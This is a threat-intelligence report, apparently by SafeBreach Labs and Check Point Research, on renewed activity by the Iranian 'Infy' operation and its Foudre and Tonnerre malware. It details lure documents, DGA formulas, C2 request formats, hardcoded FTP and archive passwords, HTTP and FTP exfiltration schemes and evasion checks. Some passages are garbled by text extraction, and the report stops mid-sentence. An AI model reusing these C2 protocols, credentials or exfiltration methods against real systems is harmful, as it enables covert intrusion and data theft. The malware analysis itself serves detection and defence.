What\nonce used to be a black art, reserved to the elite of the elite and conducted by few, has now become a land of opportunities for almost any\ngovernment around the world. Iran is no exception to this trend, with new discoveries made every year repeatedly attributed to the Islamic\nrepublic.\n\nOne of the earliest Iranian cyber operations that was ever brought to light was “Infy” (aka “Prince of Persia”). Evidence for activities of this\noperation dates back to 2007. This cyber operation was very active since its early stages, and was shown to target victims mainly in Iran and\nthroughout Europe, and was likely a government-backed operation.\n\n[In this research, which is a cooperation between SafeBreach Labs and Check Point Research, we identify evidence of renewed activity by this](https://safebreach.com/blog/2021/After-Lightning-Comes-Thunder)\noperation. It seems that following a long downtime, the Iranian cyber attackers were able to regroup, fix previous issues and dramatically\nreinforce their OPSEC activities as well as the technical proficiency and tooling capabilities.\n\nThis report will shed new-light on this long lasting Iranian cyber operation – revealing new techniques used, the underlying infrastructure,\nstealth techniques and other new elements of this actor’s modus operandi.\n\n**Key findings:**\n\n1. A new, previously unknown, second stage malware with extended capabilities.\n2. A more mature form of the known “Infy” malware family.\n3. A review of recent C2 infrastructure including HTTP/FTP servers and RSA signatures.\n\n## Background\n\n\n-----\n\n0 6, a o to et o s U t [d sco e ed](https://unit42.paloaltonetworks.com/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/) y, a c as p esu ed att buted to a a d ad a te est g c o ce o ta gets,\namongst them US Government and Israeli companies. The operation’s activity had been traced all the way to 2007. At the time, Qi-Anxin\n[focused on a specific attack targeting Danish diplomats, and named the attack Operation Mermaid, which covered the same methods and](https://en.qianxin.com/threat/reportdetail?report_id=207)\ninfrastructure.\n\n[After the publication, Unit 42 decided to conduct a takedown operation. This gave the researchers more visibility about the origin of victims, the](https://unit42.paloaltonetworks.com/unit42-prince-of-persia-game-over/)\nmotive of the attackers and the scope of the attack. The data gathered reaffirmed the Iranian connection – most victims were either in Iran, or\nwere Iranian dissidents, and the attackers did not seem to be financially motivated. As a result of the takedown Infy lost access to almost all of\nthe campaign victims.\n\n[Research by Claudio Guarnieri and Collin Anderson elaborated more on the Iranian attribution.](https://www.blackhat.com/docs/us-16/materials/us-16-Guarnieri-Iran-And-The-Soft-War-For-Internet-Dominance-wp.pdf)\nThe threat group compromised two news websites related to Jundallah as early as 2010, and exploited ActiveX vulnerabilities to attack the\nwebsites’ visitors. Infy seemed to have operated heavily around the 2013 Iranian Presidential elections, targeting Persian press members\n(such as BBC Persian), and resumed attacking civil society members and activists afterwards.\n\nGuarnieri & Anderson also observed that after the takedown by Palo Alto Networks, the Telecommunication Company of Iran blocked and\nredirected any traffic originating from Iran and aimed at Palo Alto’s sinkholes. This was probably a deliberate attempt by the actors to reduce\nvisibility and regain control of the victims. This is not an ability demonstrated by most threat actors (indeed, we are hard-pressed to find\nprecedent for it), and it suggests a potential connection to the Iranian government.\n\nFollowing these events, the operation wound down until August 2017, when Infy’s activity was [observed again, this time through the use of a](https://unit42.paloaltonetworks.com/unit42-prince-persia-ride-lightning-infy-returns-foudre/)\nnew malware dubbed Foudre.\n\n## Recent activity – lightning strikes again\n\nDuring the first half of 2020, new versions of Foudre emerged with new documents designed to lure victims. These operated in a slightly\ndifferent manner than before – instead of having the victim click on what appears to be a link to a video, the malware would run a macro once\nthe victim closes the document.\n\n\n-----\n\nFigure 1: Full infection chain.\n\n\n-----\n\nFigure 2: Example of a document sent to potential victims.\nOne document (Figure 2) contained a photo of Mojtaba Biranvand, the governor of Dorud city in Lorestan Province, Iran. The document is in\n[Persian and includes information regarding the governor’s office and his phone number (the number actually belongs to a lawyer in Lorestan).](https://www.iranvakil.org/lorestan/)\n\nAnother document, also in Persian, contains the logo of ISAAR, the Iranian government-sponsored Foundation of Martyrs and Veterans Affairs\nwhich provides loans to disabled veterans and families of martyrs.\n\nFigure 3: ISAAR document sent to potential victims.\nWhen the victim opens the document, a macro extracts the embedded package to the temp directory as fwupdate.temp and executes it after\nthe document closes.\n\n[In 2018 Intezer covered Foudre version 8, which contained a certain sample labeled unknown binary that was not explored in Intezer’s](https://www.intezer.com/blog/research/prince-of-persia-the-sands-of-foudre/)\nresearch. In fact, this was a new component — called Tonnerre — which was a new step in the evolution of Infy, and contained various\nfunctionality absent from Foudre alone.\n\n## Victims\n\nWe used several methods to try and determine the current victims of Foudre & Tonnerre.\n\n\n-----\n\ne st as eg ste g t e G do a s ou se es, a d ste g to co g co ect o s t t e pa a ete s t e a a e se t e te ed\nout repeat connections, which were uncommon to the malware (these could indicate traffic generated by researchers – we can only speculate).\nOnly a few dozen victims contacted our servers.\n\nA curious point is that none of these victims were Iranian, which may indicate the attackers learned from the takedown and had the DNS\nrecords in Iran changed preemptively (although this, again, is purely speculation).\n\nThe second method we used to probe the campaign was passive DNS. That way we were able to see a broader scope of the attack. For\nexample, we could see if some IP address was the origin of several resolution requests in succession, and in some cases if the connectivity\ncheck occurred right before attempting to connect to the C2 server. Ignoring traffic which doesn’t correlate with the correct dates for the\ndomain, we were left with a handful of new victims. Two targets with persistent connectivity, as well as a connectivity check prior to contacting\nthe C2, were in Turkey – one belongs to a University, and the other belongs to a state owned investment bank.\n\nBelow is the distribution of victims by geolocation. These correlate with previous findings on Infy, except for the glaring absence of Iranian\nvictims.\n\nFigure 4: Victim distribution by country\n\n**Foudre Known Versions**\n\n**Version No.** **Timestamp** **Notes**\n\n**Foudre 1-2** Februrary 2017 Discovered by Palo Alto in 2017\n\n**Foudre 3** October 2017\n\n**Foudre 7** Probably April 2018 Newly discovered\n\n**Foudre 8** August 2018 Discovered by Intezer in 2018\n\n**Foudre 20** April 2020 Newly Discovered\n\n**Foudre 21** July 2020\n\n**Foudre 22** October 2020\n\n## Foudre Version Differences\n\nMost differences include minor technical detail, such as Window names, Export function names and strings. However the latest versions of\nFoudre include some key differences:\n\n**DGA Formula – The updated algorithm for generating domains computes a CRC32 of the string** `NRV1{}{}{}.format(date.year,`\n```\n   date.month, weeknumber), with a start date of December 27, 2018.\n\n```\nThe possible TLDs are: `.space, .net, .dynu.net, .top .`\nThis is probably to evade detection of security vendors who are using the previously published DGA.\n**C2 RSA Verification – Foudre verifies the server is authentic by downloading a signature file, signed by the server and verifying it. This**\nmakes the operation more resilient against third-party takedowns.\n\n\n-----\n\n**oud e st** **g** **ot p ese t** p e ous e s o s t e do c as used o ey ogg g as a ed oud e, c b oug t t e\nmalware its name. In the latest version, this was changed to “Form1”. This change could help the malware evade signature detection\n(and generally, this sort of thing should be kept in mind when writing signatures).\n\n_Figure 5 – Foudre version 20._\n\n## Embedded articles\n\nOne of the discoveries that caught our eye during the analysis was a unique piece of text embedded in each of the binaries. This text was\ncopied from various media websites from around the time when the binary was released. This finding can confirm that the date of the sample is\nat most as old as those articles.\n\n[Foudre version 21 included a text from an article published on July 29.](https://www.france24.com/en/20200729-trump-defends-use-of-hydroxychloroquine-to-ward-off-covid-19-contradicts-health-officials)\n\n_Figure 6 – July 2020 article embedded into Foudre version 21_\n\n[Foudre version 22 had the next message, coming from an article published by the BBC:](https://www.bbc.com/news/world-europe-54504123)\n\n\n-----\n\nFigure 7 – October 2020 article embedded into Foudre\n\nversion 22\nAfter connecting to the C2, Foudre downloads an encrypted self-extracting archive (SFX), and then decrypts and runs it. The SFX includes an\nexecutable and an RSA public key.\n\n**Tonnerre – Second-Stage Payload**\n\nFoudre’s new versions were downloading Tonnerre 11 as the payload, but the first two versions were also tracked. Version “10” is actually the\nearliest sample, which was dropped by Foudre 8. For more information, see Appendix B.\n\n**Version No.** **Time of emergence** **Notes**\n\n**10 – MaxPinner** August 2018 From Foudre 8\n\n**1** September 2018 Newly discovered\n\n**2** March 2019 Newly discovered\n\n**11** Probably July 2020 Newly discovered – latest version\n\nTonnerre is used to expand the functionality of Foudre; possibly its functionality was put into a separate component to make sure it is deployed\nonly when needed, and meets fewer prying eyes. Like Foudre, it is written in Delphi.\n\nIts capabilities:\n\nSteals files from predefined folders as well as external devices.\nExecutes commands from the C2 server.\nRecords sound.\nCaptures screen.\n\nThe executable is exceptionally large at 56Mb, and camouflages itself as legitimate software.\n\nVersion 1 is camouflaged as “SilverSoft Speed”, and version 11 as “Synaptics”.\n\n\n-----\n\n_Figure 8 – Tonnerre v.1 – Silversoft Speed._\n\nLike Foudre, Tonnerre has embedded strings from news articles which reinforces the notion that both tools come from the same developers.\n\n_Figure 9 – Tonnerre version 11_\n\nhardcoded strings.\nSimilar to Foudre, Tonnerre uses a DGA to find its C2, and verifies it as a valid server using an RSA signature, which is decrypted with the\npublic key from the SFX.\nTonnerre uses this C2 to:\n\nStore general metadata about the victim\nSteal files with predefined extensions\nDownload updates.\nGet an additional C2.\n\nThe second C2 is used to store the stolen data, and it can also provide a list of commands to run.\n\nCommunication to the first C2 uses HTTP, whereas the second C2 communicates using FTP. The FTP password is hardcoded in the malware,\nbut the username is the name of the victim’s computer, which was previously sent to the HTTP C2.\n\n## Appendix A – Tonnerre deep dive\n\n Forms\n\nThe malware contains 5 Delphi forms, with each one responsible for a different capability:\n\n**Form1 – Malware Installation and upgrading process.**\n\nThe malware runs for the first time with param /set <machine GUID in hex>, creates an installation folder and copies itself as helper.exe. The\nsecond installation stage creates a link and runs its persistence mechanism:\n\nA scheduled task for helper.exe -ex <machine GUID in hex>.\nRegistry “Run” key.\n\nRunning it with a wrong GUID, or on another machine will fail because the malware verifies that GUID value. It also verifies that the “Deep\nFreeze” process is not running, otherwise Tonnerre exits immediately.\nTonnerre also checks for the presence of Kaspersky endpoint protection by looking for a “Kaspersky Lab” folder under %programfiles%. If this\nfolder exists, the malware tries to bypass detection by performing a sleep cycle after setting its persistence.\n\n**Form2 – Collects files from predefined folders – Documents, Downloads, Pictures and more. It also sets a notify event for specific file types**\nlike MS Word files.\n\nFiles are also collected from network shares using WNetOpenEnumW and WNetEnumResourceW functions from mpr.dll.\nPrint screens are also collected if the screen saver is not active at the moment of checking.\n\n**Form3 – Connects to an FTP server to exfiltrate collected data and get further commands.**\n\n**Form4 – Collects files from removable devices for exfiltration. This is done by monitoring WM_DEVICECHANGE messages and enumerating**\nthe devices.\n\n\n-----\n\n**o** **5** Uses t e a e co a d e too to eco d sou d s s so e at s a to a ot e a a att buted, [a a,](https://research.checkpoint.com/2020/nazar-spirits-of-the-past/) c used t\nas a DLL. Despite this similarity, there doesn’t seem to be a link between the groups.\nThe exact command line is: lame.exe -b 8 -m m rvfrtc8.tmp fcvd10v.tmp\n\n## C2 Communication\n\n### DGA\n\nThe dga start date is 12/25/2017 with the next TLDs: `'.site','.com','.win' .`\n\nThe domain is decided by the next formula:\n```\n\"NITV1{}{}{}\".format(date.year, date.month, weeknumber)\n\n```\n\nOne of the generated C2 servers is `638ffe48.site . Like all other domains since March 2020, this was resolved to the IP address`\n```\n185.141.61[.]37 .\n\n```\n[The malware uses https://www.france24.com/en/top-stories/rss/ to get the current date for the DGA.](https://www.france24.com/en/top-stories/rss/)\n\n### Receiving Executable Updates\n\nFirst, just like Foudre, the malware verifies the HTTP C2 server by downloading a signature file using the next GET request:\n```\n/s/?d=<days from first date>\"&t=<timestamp>\"\n\n```\n\nNext, after verifying the C2, the malware downloads the second signature file.\n```\nGET /2017/?c=<comp-name>&u=<user-name>&v=00011&f=fdir1&mi=<machine-guid>&t=<timestamp|> HTTP/1.1\n\n```\n\nThe C2 server responds in a location field: update32.sig.\n\nThe sig file is downloaded from `/2017/update32.sig`\n\nFinally, a request is sent to 2016/update32.tmp (this URL was not responsive when we checked). An SFX is downloaded, decrypted and\nexecuted, with a random looking password (in our case it was `TtckjcAa54cE ).`\n\n### Getting the FTP Server\n\nThe malware gets the C2 FTP server IP address by performing the next request to the C2 server:\n```\nGET /f/?c=<computer-name>&mi=<machine-guid>&t=<timestamp> HTTP/1.1\n\n```\n\nThe C2 uses the same HTTP redirection with this response format:\n```\n<year><days since last first dga day><.tmp>\n\n```\n\nFor example: `2020209.tmp .`\n\nIt then performs a GET request to `/f/2020209.tmp . Example for a downloaded file:`\n```\n266/:5/321/93\nAVqGDTHK6ZAbnNtvg09lHkXUUBw2UYho18bjE9f6ILDw9SYCEPR0R1TS6+4H/UpjrV3Z+m0BpEaxdWW9qul9pDNYS7LkZOWx2G18JI8X/aWwC+yQoL2wC6aG\n69\n1512\n443\n\n```\nThis file has 3 parts:\n\n1. The obfuscated FTP server. The IP could be retrieved easily using a python one-liner: `print(bytes([ch-1 for ch in`\n```\n   b'266/:5/321/93'])) which gives 155[.]94[.]210[.]82.\n\n```\n2. An RSA signature of the FTP server.\n3. List of open ports on the FTP server.\n\nFrom this point on, the malware uses that server to fetch its next command. After executing the command, the output is uploaded using FTP\nas well.\n\n### FTP Protocol\n\n**Login**\n\n\n-----\n\nThe malware connects to the FTP server using its computer name as the username and one of two fixed passwords: “tpass15A42” or\n“tpass14A43”. The password can be decoded using the same Python snippet used for getting the FTP server.\n\n_Figure 10 – Deobfuscated FTP passwords._\n**Command Execution**\n\nCommand execution process is done by downloading a command file from the FTP server. We were able to enumerate the following\ncommands:\n\nMyIdle\nMyDelete\nMyRename\nMyRun\nMyEndTask\nMyZip\nMyShell\nFTP – GET\nFTP – PGET – get multiple files.\nFTP – PUT – upload a file.\nFTP – upload dirlist (using FTP put)\n\n**Dual Data Exfiltration**\n\nExfiltration of data which was collected based on the C2 server command is performed via FTP.\nExfiltration of data collected otherwise (built in Tonnerre logic) is performed via HTTP POST request:\n\nPOST /blog/?<timestamp> HTTP/1.1\n\nAnd the next data fields:\n\nc=<computer-name>&u=<user-name>&v=00011&f=fdir1&mi=<machine-guid>&txt=<exfil data>&e=EOF\n\nThe C2 server response for a valid exfiltration is misleading:\n“There is a problem, the page you requested does not exist”\nThere are also custom 404 error response messages when requesting a valid directory in the server:\n“Not Found\n\nThe requested URL was not found on this server.\n\nAdditionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.”\n\nTonnerre searches for files based on the file extension:\n\n\n-----\n\n_Figure 11 – file types Tonnerre exfiltrates_\n\n## Exfiltrated files\n\nAn example of the name of the file format is:\n```\n<file name crc32>-<file size>-<modified timeStamp>-<created timeStamp>\n\n```\n\ne.g. `ceb60f97-53807-1597696028-1360110435`\n\nThe exfiltrated data is in a format of a WideChar array, and should end with the following suffix: `<Computer name><user-name><version>`\n```\n<directory><machine-guid><exfil file path>\n\n```\nThe data also should be base64 encoded before put into the message body.\n\nThe content is – base64 encoded zlib encrypted file content and after it the file’s metadata in hex:\n\nComputer name, username, Tonnere version, uploaded dir in c2 server, machine GUID and file path in the victim’s machine.\n\n### File and input capture and collection\n\nThe malware creates several directories to store the stolen files:\n\n“R”, “F”, “H”, “V”, “S”, “G”.\n\n\n-----\n\n_gu e_ e st o d ecto es used o e t ated data,,,,S\n\n**G = Grabbed (files from recycle bin)**\n`.doc` files grabbed from the recycle bin.\n\n**F = Fixed (all .doc files from supported drive types)**\nThe drive types that are supported: fixed, remote, ramdisk, removable\n\n**S = Screen**\n\nSaved as psf files (Print Screen File).\n\n**H – files from predefined folders and network shares**\n\nFiles from user directories (downloads, pictures, contacts) and from network shares are saved in H.\n\n**R = Recent files**\n\nFiles that were written to the “Recent Items” folder, as enumerated in the `Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell\nFolders\\Recent` registry key.\n\n**V = Voice Recording**\nUsed for the voice recordings generated by Form 5.\n\n## Appendix B – Foudre deep dive\n\n### Foudre version 20-22\n\n C2 Protocol\n\nAs we showed previously, the C2 server is first authenticated by downloading a signature file obtained by querying the next HTTP GET\nrequest:\n```\nGET <C2 server host name>/de/?d2020209.sig&v=00020&t=<timestamp> HTTP/1.1\n\n```\n\nThe server does HTTP redirection with the following value:\n\nLocation: <C2 server host name>/2020209.sig\n\nThis creates a GET request on this location:\n```\nGET /de/<C2 server host name>/2020209.sig HTTP/1.1\n\n```\n\nAfter the C2 server is verified as trusted, the malware checks for new versions of the malware by trying to download a second signature file.\n\nThis is done by the next GET request:\n```\nhttps://<C2 server host name>/2015/?c=<computer name>&u=<username>&v=00020&\ns=Test201&f=datadir1&mi=<machine guid>&b=<os 64/32 bit arch>&t=<timestamp>\n\n```\n_Figure 13 – July 2020 article embedded into Foudre version 21_\n\nThe C2 server returns a signature file named t00011-3.sig, which refers to Tonnerre version 11.\n\nThe final step is performing a request to download the latest version of the malware:\n\nGET /2014/t00011-3.tmp HTTP/1.1\n\n\n-----\n\n_Figure_\n\n_14 – July 2020 article embedded into Foudre version 21_\n\nThe server responds with an encrypted RAR SFX file with the password RBA4b5a98Q.\nAfter decryption, we got the Tonnerre malware version 11 and a public key file.\nThe size of the malware is 56MB, an unusual size for malware samples and which may allow it to avoid detection as many vendors ignore\nlarge files and won’t scan\\monitor them.\n\n_Figure 15 – t00011.tmp – SFX file_\n\nTonnerre 11 is the latest version served from the c2 as of our research. It has been using the exact same update file since at least as early as\n27/7/20, and until at least as late as 14/11/20.\n\nThe path of the embedded object C:\\Users\\Alex\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Word\\  was also used in an earlier\nWord dropper which drops Infy version 21:\n\nFigure 16 – The embedded path into Version 21\n\ndocument\n\n### Campaign Names\n\nWhen we observed the HTTP requests, we could see the subject name “TehN005” which seems to have served as a sort of campaign ID:\n\nhxxp://35b268a6.top/2015/?c=<computer-name>&u=<user-name>&v=00022&s=TehN005\n\n&f=datadir1&mi=<machine-guid>&b=64&t=<timestamp>\n\nFoudre Ver. 1 – 2017FSU\n\nFoudre Ver. 2 – 17weh44 – (probably 2017 week 44)\n\nFoudre Ver. 3 – af17818 – (probably 18/8/17) – was downloaded from the C2 https://eab6ff48[.]stream/update/af17818.tmp resolved to\n[185.148.144[.]3 (VirusTotal) which also resolved to eab6ff48.dynu.net. This means that Foudre was downloaded from an additional host name](https://www.virustotal.com/gui/ip-address/185.148.144.3)\n<dga hostname>.streamWas probably sent by email – (virusTotal 2017-10-06 14:13:29 59bbae76 – email)\n\n\n-----\n\noud e e /5 **y uSub (p obab y e e s to t e C** **do** **a** **dy u** **et)**\n\nFoudre Ver. 7- S180313 – (probably 13/3/18)\n\nFoudre Ver. 11 – Rec11-1 – (probably Recording version 11)\n\nFoudre Ver. 20 – Test201 (Test 1 version 20)\n\nFoudre Ver. 21 – TehN002 – (probably version Number 2)\n\nFoudre Ver. 22 – TehN005 – (probably version Number 5)\n\n### SFX File\n\nThe executable file dropped by the above macros is an SFX File – Self-Extracting archive. When we decompress it, we get an extraordinary\nexecutable size – 275 MB.\n\n_Figure 17 –_\n\n_SFX content of Foudre 21_\nIt uses rundll to load “conf4389.dll” (Foudre loader), which in turn runs DLL “d488” and calls an exported function named “f8754”. The loader\nalso creates a persistence mechanism by scheduling a task to run itself again.\n\n### Foudre 8 – Tonnerre first occurrence\n\nAs mentioned previously, Tonnerre was already deployed in Foudre version 8 that was featured in Intezer’s publication.\n\nThe attack vector chosen was an SFX embedded into an office document. In the later versions that we analyzed, the contents of the SFX were\ndifferent.\n\n_Figure 18 – Content of Foudre 8 SFX c38533b85e4750e6f649cc407a50031de0984a8f3d5b90600824915433a5e218_\n\nThe new SFX includes the following files:\n\n**I7234.dll is the initial loader.**\n**d388 is the first loaded dll as Foudre version 8.**\n**dfbpbtge.tmp is a sample with different capabilities which is the successor of past “Infy M” – used as a second stage payload.**\n\n_Figure 19 – dfbptge.tmp – Tonnerre/“Max Pinner”_\n\nThis loader executes what was defined by Intezer as an “unknown binary”. The execution of this binary happens only in the absence of the\n[process “dfserv.exe”, which belongs to Faronics’ Deep Freeze.](https://www.faronics.com/en-uk/products/deep-freeze)\n\nThe payload also checks if previous versions of this malware family are already installed on the victim’s computer. The check is done by\nsearching for the window name Tonnerre from version 1 to 9.\n\n\n-----\n\ne C se e as a ed a dcoded add ess stead o t e usua G a go t used by oud e e dec ypted C s p e ebs te c\nprobably explains why this version was named MaxPinner internally.\n\n_Figure 20 – dfbptge.tmp –_\n\nTonnerre appears for the first time.\n\n_Figure 21 – dfbptge.tmp – fixed C2 server –_\n\npinner.website.\n**_Foudre 7 – previously unknown_**\n\nThe sfx is quite different from other versions:\nIt includes a white picture image file Thumbs.bmp which has a size of 63M probably to increase the size of the SFX. There is also a third dll,\n“r3066”, which is just used to call the D2 export of the main Foudre’s dll d392 instead of calling it from the loader dll i7765.dll.\n\nThe decoy movie is violent and is
